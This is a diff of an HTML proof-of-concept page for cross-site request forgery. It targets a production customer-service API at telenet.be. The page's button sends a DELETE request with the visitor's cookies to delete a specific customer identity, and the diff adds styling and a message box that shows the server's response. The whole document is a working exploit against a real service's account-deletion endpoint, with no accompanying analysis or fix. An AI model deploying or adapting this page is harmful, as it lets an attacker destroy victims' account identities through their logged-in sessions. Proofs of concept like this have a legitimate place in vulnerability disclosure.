@@ -1,21 +1,43 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>CSRF PoC</title>
+    <title>CSRF PoC - Delete Identity</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        padding: 20px;
+      }
+      #message {
+        margin-top: 20px;
+        padding: 10px;
+        border-radius: 5px;
+        border: 1px solid #ccc;
+        background: #f9f9f9;
+      }
+    </style>
   </head>
   <body>
-    <h3>Click to send CSRF DELETE request</h3>
+    <h3>Click the button below to send a CSRF DELETE request:</h3>
     <button onclick="sendCSRF()">Delete Identity</button>
+
+    <div id="message">Waiting for user action...</div>
 
     <script>
       function sendCSRF() {
+        const messageDiv = document.getElementById("message");
+        messageDiv.textContent = "Sending request...";
+
         fetch("https://api.prd.telenet.be/ocapi/public/api/customer-service/v1/identities/19356750", {
           method: "DELETE",
           credentials: "include"
         })
-        .then(response => response.text())
-        .then(data => console.log("Response:", data))
-        .catch(err => console.error("Error:", err));
+        .then(async response => {
+          const text = await response.text();
+          messageDiv.textContent = `Server responded with status ${response.status}: ${text}`;
+        })
+        .catch(error => {
+          messageDiv.textContent = `Request failed: ${error}`;
+        });
       }
     </script>
   </body>
